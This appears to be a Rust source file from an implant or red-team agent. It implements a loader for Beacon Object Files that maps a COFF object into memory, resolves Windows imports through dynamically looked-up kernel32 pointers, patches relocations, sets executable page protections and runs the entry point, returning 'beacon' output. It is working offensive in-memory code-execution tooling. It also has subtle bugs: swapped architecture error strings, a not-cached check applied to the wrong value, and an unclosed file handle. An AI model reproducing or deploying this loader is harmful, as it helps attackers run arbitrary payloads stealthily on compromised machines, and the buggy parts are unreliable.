use alloc::{
    boxed::Box,
    string::String,
    vec::Vec,
};
use core::{ffi::c_void, slice};
use core::cell::RefCell;
use core::{
    mem::{size_of, transmute},
    ptr::{null_mut, read_unaligned, write_unaligned},
};

use crate::{
    get_instance,
    libs::coffee::{
            beacon_api::{get_function_internal_address, get_output_data},
            parser::{Coff, CoffError, CoffMachine, CoffSource, IMAGE_RELOCATION, IMAGE_SYMBOL},
        },
};

// Memory allocation flags
pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;
pub const MEM_RELEASE: u32 = 0x00008000;
pub const MEM_TOP_DOWN: u32 = 0x00100000;

// Memory protection constants
pub const PAGE_NOACCESS: u32 = 0x01;
pub const PAGE_READONLY: u32 = 0x02;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_WRITECOPY: u32 = 0x08;
pub const PAGE_EXECUTE: u32 = 0x10;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
pub const PAGE_NOCACHE: u32 = 0x200;

// Relocation types
pub const IMAGE_REL_AMD64_ADDR64: u32 = 0x0001;
pub const IMAGE_REL_AMD64_ADDR32NB: u32 = 0x0003;
pub const IMAGE_REL_AMD64_REL32: u32 = 0x0004;
pub const IMAGE_REL_AMD64_REL32_5: u32 = 0x0009;
pub const IMAGE_REL_I386_DIR32: u32 = 0x0006;
pub const IMAGE_REL_I386_REL32: u32 = 0x0014;

// Symbol class
pub const IMAGE_SYM_CLASS_EXTERNAL: u8 = 2;
pub const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
pub const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
pub const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;
pub const IMAGE_SCN_MEM_NOT_CACHED: u32 = 0x04000000;

type CoffMain = fn(*mut u8, usize);

#[derive(Debug)]
pub enum CoffeeLdrError {
    FileReadError(String),
    ParseError(String),
    MemoryAllocationError(u32),
    MemoryProtectionError(u32),
    ModuleNotFound(String),
    FunctionNotFound(String),
    FunctionInternalNotFound(String),
    SymbolIgnored,
    TooManySymbols(usize),
    OutputError,
    InvalidRelocationType(u16),
    ArchitectureMismatch { expected: String, actual: String },
}

pub struct CoffeeLdr<'a> {
    coff: Coff<'a>,
    section_map: RefCell<Vec<SectionMap>>,
    function_map: RefCell<FunctionMap>,
}

impl<'a> Default for CoffeeLdr<'a> {
    fn default() -> Self {
        Self {
            coff: Coff::default(),
            section_map: RefCell::new(Vec::new()),
            function_map: RefCell::new(FunctionMap::default()),
        }
    }
}

impl<'a> CoffeeLdr<'a> {
    pub fn new<T: Into<CoffSource<'a>>>(source: T) -> Result<Self, CoffError> {
        let coff = match source.into() {
            CoffSource::File(path) => {
                let mut wpath: Vec<u16> = path.encode_utf16().chain(Some(0)).collect();

                let handle = unsafe {
                    (get_instance().unwrap().k32.create_file_w)(
                        wpath.as_mut_ptr(),
                        0x80000000,
                        0,
                        null_mut(),
                        3,
                        0x80,
                        null_mut(),
                    )
                };

                let mut size_high = 0u32;
                let size_low =
                    unsafe { (get_instance().unwrap().k32.get_file_size)(handle, &mut size_high) };
                let total_size = ((size_high as u64) << 32) | (size_low as u64);
                let mut buffer = Vec::with_capacity(total_size as usize);
                buffer.resize(total_size as usize, 0);

                let mut bytes_read = 0;
                let read_result = unsafe {
                    (get_instance().unwrap().k32.read_file)(
                        handle,
                        buffer.as_mut_ptr(),
                        total_size as u32,
                        &mut bytes_read,
                        null_mut(),
                    )
                };

                Coff::from_buffer(Box::leak(buffer.into_boxed_slice()))?
            }
            CoffSource::Buffer(buffer) => Coff::from_buffer(buffer)?,
        };

        Ok(Self {
            coff,
            section_map: RefCell::new(Vec::new()),
            function_map: RefCell::new(FunctionMap::default()),
        })
    }

    pub fn run(
        &self,
        entry: &str,
        args: Option<*mut u8>,
        argc: Option<usize>,
    ) -> Result<String, CoffeeLdrError> {
        self.prepare()?;

        for symbol in &self.coff.symbols {
            let name = self.coff.get_symbol_name(symbol);
            if name == entry && Coff::is_fcn(symbol.Type) {
                let section_addr =
                    self.section_map.borrow()[(symbol.SectionNumber - 1) as usize].base;
                let entrypoint = unsafe { section_addr.offset(symbol.Value as isize) };
                let coff_main: CoffMain = unsafe { transmute(entrypoint) };
                coff_main(args.unwrap_or(null_mut()), argc.unwrap_or(0));
                break;
            }
        }

        let beacon_output = get_output_data().ok_or(CoffeeLdrError::OutputError)?;
        Ok(if !beacon_output.buffer.is_empty() {
            let slice =
                unsafe{slice::from_raw_parts(beacon_output.buffer.as_ptr() as *const u8, beacon_output.buffer.len())};
            match String::from_utf8(slice.to_vec()) {
                Ok(valid_str) => valid_str,
                Err(_) => String::from("Error converting out to string"), // or handle error
            }
        } else {
            String::new()
        })
    }

    fn prepare(&self) -> Result<(), CoffeeLdrError> {
        self.check_architecture()?;
        let allocated_sections = self.alloc_bof_memory()?;
        self.section_map.replace(allocated_sections);

        let (functions, function_map) = FunctionMap::new(&self.coff)?;
        self.function_map.replace(function_map);

        let mut index = 0;
        for (i, section) in self.coff.sections.iter().enumerate() {
            let relocations = self.coff.get_relocations(section);

            for relocation in relocations.iter() {
                let symbol = &self.coff.symbols[relocation.SymbolTableIndex as usize];
                let symbol_reloc_addr = (self.section_map.borrow()[i].base as usize
                    + unsafe { relocation.Anonymous.VirtualAddress } as usize)
                    as *mut c_void;

                let name = self.coff.get_symbol_name(symbol);
                if let Some(function_address) =
                    FunctionMap::find_function_address(&functions, &name)
                {
                    unsafe {
                        let function_address = function_address as *mut c_void;
                        let address = self.function_map.borrow().address.add(index);
                        address.write(function_address);

                        self.process_relocation(
                            symbol_reloc_addr,
                            function_address,
                            address,
                            relocation,
                            symbol,
                        )?;
                    };

                    index += 1;
                } else {
                    self.process_relocation(
                        symbol_reloc_addr,
                        null_mut(),
                        null_mut(),
                        relocation,
                        symbol,
                    )?;
                }
            }
        }

        self.adjust_permissions()
    }

    fn process_relocation(
        &self,
        reloc_addr: *mut c_void,
        function_address: *mut c_void,
        function_map: *mut *mut c_void,
        relocation: &IMAGE_RELOCATION,
        symbol: &IMAGE_SYMBOL,
    ) -> Result<(), CoffeeLdrError> {
        unsafe {
            if symbol.StorageClass == IMAGE_SYM_CLASS_EXTERNAL as u8 && symbol.SectionNumber == 0 {
                match self.coff.arch {
                    CoffMachine::X64 => {
                        if relocation.Type as u32 == IMAGE_REL_AMD64_REL32
                            && !function_address.is_null()
                        {
                            let relative_address = (function_map as usize)
                                .wrapping_sub(reloc_addr as usize)
                                .wrapping_sub(size_of::<u32>());

                            write_unaligned(reloc_addr as *mut u32, relative_address as u32);
                            return Ok(());
                        }
                    }
                    CoffMachine::X32 => {
                        if relocation.Type as u32 == IMAGE_REL_I386_DIR32
                            && !function_address.is_null()
                        {
                            write_unaligned(reloc_addr as *mut u32, function_map as u32);
                            return Ok(());
                        }
                    }
                }
            }

            let section_addr = self.section_map.borrow()[(symbol.SectionNumber - 1) as usize].base;
            match self.coff.arch {
                CoffMachine::X64 => match relocation.Type as u32 {
                    IMAGE_REL_AMD64_ADDR32NB if function_address.is_null() => {
                        write_unaligned(
                            reloc_addr as *mut u32,
                            read_unaligned(reloc_addr as *mut u32).wrapping_add(
                                (section_addr as usize)
                                    .wrapping_sub(reloc_addr as usize)
                                    .wrapping_sub(size_of::<u32>())
                                    as u32,
                            ),
                        );
                    }
                    IMAGE_REL_AMD64_ADDR64 if function_address.is_null() => {
                        write_unaligned(
                            reloc_addr as *mut u64,
                            read_unaligned(reloc_addr as *mut u64)
                                .wrapping_add(section_addr as u64),
                        );
                    }
                    r @ IMAGE_REL_AMD64_REL32..=IMAGE_REL_AMD64_REL32_5 => {
                        write_unaligned(
                            reloc_addr as *mut u32,
                            read_unaligned(reloc_addr as *mut u32).wrapping_add(
                                (section_addr as usize)
                                    .wrapping_sub(reloc_addr as usize)
                                    .wrapping_sub(size_of::<u32>())
                                    .wrapping_sub((r - 4) as usize)
                                    as u32,
                            ),
                        );
                    }
                    _ => return Err(CoffeeLdrError::InvalidRelocationType(relocation.Type)),
                },
                CoffMachine::X32 => match relocation.Type as u32 {
                    IMAGE_REL_I386_REL32 if function_address.is_null() => {
                        write_unaligned(
                            reloc_addr as *mut u32,
                            read_unaligned(reloc_addr as *mut u32).wrapping_add(
                                (section_addr as usize)
                                    .wrapping_sub(reloc_addr as usize)
                                    .wrapping_sub(size_of::<u32>())
                                    as u32,
                            ),
                        );
                    }
                    IMAGE_REL_I386_DIR32 if function_address.is_null() => {
                        write_unaligned(
                            reloc_addr as *mut u32,
                            read_unaligned(reloc_addr as *mut u32)
                                .wrapping_add(section_addr as u32),
                        );
                    }
                    _ => return Err(CoffeeLdrError::InvalidRelocationType(relocation.Type)),
                },
            }
        }

        Ok(())
    }

    fn adjust_permissions(&self) -> Result<(), CoffeeLdrError> {
        self.section_map
            .borrow()
            .iter()
            .filter(|section| section.size > 0)
            .try_for_each(|section| section.adjust_permissions())
    }

    fn alloc_bof_memory(&self) -> Result<Vec<SectionMap>, CoffeeLdrError> {
        let size = self.coff.size();
        let address = unsafe {
            (get_instance().unwrap().k32.virtual_alloc)(
                null_mut(),
                size,
                MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                PAGE_READWRITE,
            )
        };

        if address.is_null() {
            return Err(CoffeeLdrError::MemoryAllocationError(unsafe {
                (get_instance().unwrap().k32.get_last_error)()
            }));
        }

        Ok(SectionMap::copy_sections(address, &self.coff))
    }

    #[inline]
    fn check_architecture(&self) -> Result<(), CoffeeLdrError> {
        match self.coff.arch {
            CoffMachine::X32 => {
                if cfg!(target_pointer_width = "64") {
                    return Err(CoffeeLdrError::ArchitectureMismatch {
                        expected: String::from("x32"),
                        actual: String::from("x64"),
                    });
                }
            }
            CoffMachine::X64 => {
                if cfg!(target_pointer_width = "32") {
                    return Err(CoffeeLdrError::ArchitectureMismatch {
                        expected: String::from("x32"),
                        actual: String::from("x64"),
                    });
                }
            }
        }

        Ok(())
    }
}

impl<'a> Drop for CoffeeLdr<'a> {
    fn drop(&mut self) {
        for section in self.section_map.borrow().iter() {
            if !section.base.is_null() {
                unsafe {
                    (get_instance().unwrap().k32.virtual_free)(section.base, 0, MEM_RELEASE);
                }
            }
        }

        if !self.function_map.borrow().address.is_null() {
            unsafe {
                (get_instance().unwrap().k32.virtual_free)(
                    *self.function_map.borrow().address,
                    0,
                    MEM_RELEASE,
                );
            }
        }
    }
}

const MAX_SYMBOLS: usize = 600;

#[derive(Debug)]
struct FunctionMap {
    address: *mut *mut c_void,
}

impl FunctionMap {
    fn new(coff: &Coff) -> Result<(Vec<(String, usize)>, FunctionMap), CoffeeLdrError> {
        let symbols = Self::process_symbols(coff)?;
        let address = unsafe {
            (get_instance().unwrap().k32.virtual_alloc)(
                null_mut(),
                MAX_SYMBOLS * size_of::<*mut c_void>(),
                MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                PAGE_READWRITE,
            ) as *mut *mut c_void
        };

        if address.is_null() {
            return Err(CoffeeLdrError::MemoryAllocationError(unsafe {
                (get_instance().unwrap().k32.get_last_error)()
            }));
        }

        Ok((symbols, FunctionMap { address }))
    }

    fn process_symbols(coff: &Coff) -> Result<Vec<(String, usize)>, CoffeeLdrError> {
        let mut functions = Vec::with_capacity(MAX_SYMBOLS);

        for symbol in &coff.symbols {
            if functions.len() >= MAX_SYMBOLS {
                return Err(CoffeeLdrError::TooManySymbols(functions.len()));
            }

            if symbol.StorageClass == IMAGE_SYM_CLASS_EXTERNAL as u8 && symbol.SectionNumber == 0 {
                let name = coff.get_symbol_name(symbol);
                //let address = Self::resolve_symbol_address(&name, coff)?;
                match Self::resolve_symbol_address(&name, coff) {
                    Ok(address) => {
                        functions.push((name, address));
                    }
                    Err(CoffeeLdrError::SymbolIgnored) => functions.push((name, 1)),
                    Err(err) => return Err(err),
                }
            }
        }

        Ok(functions)
    }

    fn find_function_address(functions: &[(String, usize)], name: &str) -> Option<usize> {
        functions
            .iter()
            .find(|(fname, _)| fname == name)
            .map(|(_, addr)| *addr)
    }

    fn resolve_symbol_address(name: &str, coff: &Coff) -> Result<usize, CoffeeLdrError> {
        let prefix = match coff.arch {
            CoffMachine::X64 => "__imp_",
            CoffMachine::X32 => "__imp__",
        };

        let symbol_name = name
            .strip_prefix(prefix)
            .ok_or(CoffeeLdrError::SymbolIgnored)?;

        if symbol_name.starts_with("Beacon") || symbol_name.starts_with("toWideChar") {
            return get_function_internal_address(symbol_name);
        }

        let (dll, mut function) = symbol_name
            .split_once('$')
            .unwrap_or(("Kernel32", symbol_name));
        //.ok_or_else(|| CoffeeLdrError::ParseError(String::from(symbol_name)))?;

        if let CoffMachine::X32 = coff.arch {
            function = function.split('@').next().unwrap_or(function);
        }

        let mut dll_string = String::from(dll);
        dll_string.push('\0');
        let mut function_string = String::from(function);
        function_string.push('\0');

        let module = unsafe {
            let mut handle = (get_instance().unwrap().k32.get_module_handle_a)(dll_string.as_ptr());
            if handle.is_null() {
                handle = (get_instance().unwrap().k32.load_library_a)(dll_string.as_ptr());
                if handle.is_null() {
                    return Err(CoffeeLdrError::ModuleNotFound(dll_string));
                }

                handle
            } else {
                handle
            }
        };

        unsafe {
            (get_instance().unwrap().k32.get_proc_address)(
                module,
                function_string.as_str().as_ptr(),
            )
            .map(|addr| addr as usize)
            .ok_or(CoffeeLdrError::FunctionNotFound(String::from(symbol_name)))
        }
    }
}

impl Default for FunctionMap {
    fn default() -> Self {
        Self {
            address: null_mut(),
        }
    }
}

#[derive(Debug, Clone)]
struct SectionMap {
    pub base: *mut c_void,
    pub size: usize,
    pub characteristics: u32,
    pub name: String,
}

impl SectionMap {
    fn copy_sections(virt_addr: *mut c_void, coff: &Coff) -> Vec<SectionMap> {
        unsafe {
            let sections = &coff.sections;
            let mut sec_base = virt_addr;
            sections
                .iter()
                .map(|section| {
                    let size = section.SizeOfRawData as usize;
                    let address = coff.buffer.as_ptr().add(section.PointerToRawData as usize);
                    let name = Coff::get_section_name(section);
                    core::ptr::copy_nonoverlapping(address, sec_base as *mut u8, size);

                    let section_map = SectionMap {
                        base: sec_base,
                        size,
                        characteristics: section.Characteristics,
                        name,
                    };
                    sec_base = Coff::page_align((sec_base as usize) + size) as *mut c_void;

                    section_map
                })
                .collect()
        }
    }

    fn adjust_permissions(&self) -> Result<(), CoffeeLdrError> {
        let bitmask = self.characteristics
            & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE);
        let mut protection = match bitmask {
            0 => PAGE_NOACCESS,
            x if x == IMAGE_SCN_MEM_EXECUTE => PAGE_EXECUTE,
            x if x == IMAGE_SCN_MEM_READ => PAGE_READONLY,
            x if x == (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE) => PAGE_EXECUTE_READ,
            x if x == IMAGE_SCN_MEM_WRITE => PAGE_WRITECOPY,
            x if x == (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE) => PAGE_EXECUTE_WRITECOPY,
            x if x == (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE) => PAGE_READWRITE,
            x if x == (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE) => {
                PAGE_EXECUTE_READWRITE
            }
            _ => PAGE_EXECUTE_READWRITE,
        };

        if (protection & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED {
            protection |= PAGE_NOCACHE;
        }

        let mut old_protect = 0;
        if !unsafe {
            (get_instance().unwrap().k32.virtual_protect)(
                self.base,
                self.size,
                protection,
                &mut old_protect,
            )
        } {
            return Err(CoffeeLdrError::MemoryProtectionError(unsafe {
                (get_instance().unwrap().k32.get_last_error)()
            }));
        }

        Ok(())
    }
}
